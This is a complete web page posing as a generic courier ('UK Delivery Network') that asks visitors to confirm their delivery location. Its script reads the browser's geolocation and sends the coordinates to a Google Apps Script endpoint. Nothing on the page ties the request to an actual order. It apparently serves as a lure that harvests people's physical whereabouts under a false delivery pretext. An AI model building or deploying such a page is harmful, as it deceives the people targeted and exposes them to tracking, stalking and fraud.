<!DOCTYPE html>
<html>
<head>
  <title>UK Delivery Network - Delivery Location</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

<style>

body {
  font-family: Arial, Helvetica, sans-serif;
  background: linear-gradient(135deg, #0b1f3a, #163d6b);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0;
}

.card {
  background: white;
  width: 90%;
  max-width: 420px;
  padding: 40px 30px;
  border-radius: 18px;
  text-align: center;
  box-shadow: 0 15px 40px rgba(0,0,0,0.25);
}

.logo img {
  width: 150px;
  max-width: 80%;
  margin-bottom: 15px;
}

.logo {
  font-size: 28px;
  font-weight: bold;
  color: #0b1f3a;
}

.tagline {
  color: #666;
  margin: 15px 0 30px;
}

h2 {
  color: #0b1f3a;
}

p {
  line-height: 1.6;
  color: #555;
}

button {
  background: #c9a227;
  color: white;
  border: none;
  padding: 16px 30px;
  border-radius: 50px;
  font-size: 17px;
  font-weight: bold;
  cursor: pointer;
  margin-top: 20px;
}

button:hover {
  background:#b08b1e;
}

#status {
  margin-top:20px;
  color:#0b1f3a;
  font-weight:bold;
}

.footer {
  margin-top:25px;
  font-size:12px;
  color:#888;
}

</style>

</head>

<body>

<div class="card">

<div class="logo">

<img src="logo.png" alt="UK Delivery Network Logo">

<div>
UK Delivery Network
</div>

</div>


<div class="tagline">
Fast • Reliable • Professional Delivery
</div>


<h2>
Confirm your delivery location
</h2>


<p>
To help ensure your delivery arrives smoothly, please confirm your location.
</p>


<p>
Your device will ask for permission. Your location is only used to complete this delivery.
</p>


<button onclick="getLocation()">
📍 Confirm Delivery Location
</button>


<p id="status"></p>


<div class="footer">
UK Delivery Network © 2026
</div>


</div>


<script>

function getLocation() {

const status = document.getElementById("status");


if (navigator.geolocation) {


status.innerHTML = "Requesting location permission...";


navigator.geolocation.getCurrentPosition(

function(position) {


let data = {

latitude: position.coords.latitude,

longitude: position.coords.longitude

};


fetch("https://script.google.com/macros/s/AKfycbzTv_wEkD1JSd_3F_kXT1f0u-ipulotH8HXEZ0VEfsQS0csi8Yx2w3BpqPPmDpCLdQ/exec",
{

method: "POST",

body: JSON.stringify(data)

})


.then(() => {

status.innerHTML = "✓ Location received. Thank you.";

})


.catch(() => {

status.innerHTML = "Unable to send location.";

});


},


function() {

status.innerHTML = "Location was not shared.";

}


);


}

else {

status.innerHTML = "Location sharing is not supported on this device.";

}


}

</script>


</body>
</html>
